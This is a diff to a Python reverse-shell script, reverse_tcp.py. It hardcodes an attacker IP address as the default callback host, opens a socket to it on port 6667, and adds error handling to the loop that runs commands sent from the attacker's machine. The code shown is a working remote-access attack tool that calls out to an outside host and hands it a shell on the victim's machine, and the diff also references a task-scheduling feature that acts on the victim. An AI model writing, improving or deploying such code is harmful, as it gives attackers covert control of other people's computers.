@@ -8,9 +8,12 @@
 ### python reverse_tcp.py attacker_ip
 ###      eg:
 ###           python reverse_tcp.py 192.168.2.5
+###
+
+attacker_ip = "45.55.139.173"        ## attacker's ip, change this ip address if necessary.
+
 
 import socket, subprocess, os, platform, sys
-
 
 
 '''
@@ -94,8 +97,6 @@ if (platform.system() == "Windows"):
 
 if len(sys.argv) >= 2:
     attacker_ip = sys.argv[1]       ## get attacker's ip from command line
-else:
-    attacker_ip = "45.55.139.173"        ## attacker's ip, change this ip address if necessary.
 attacker_port = 6667                ## attacker's port
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)   ## connect to attacker's machine
 s.connect((attacker_ip, attacker_port))
@@ -105,8 +106,11 @@ while True:
     if command == "exit":         # quit shell
         break
     if len(command) > 3 and command[0: 3] == "cd ": # change directory
-        os.chdir(command[3:])
-        s.send(" ")
+        try:
+            os.chdir(command[3:])
+            s.send(" ")
+        except:
+            s.send("cd: " + command[3:] + ": No such file or directory") 
         continue;
     if len(command) > 9 and command[0: 9] == "schedule ": # schedule the task when victim connect to attacker
         if (platform.system() == "Windows"):
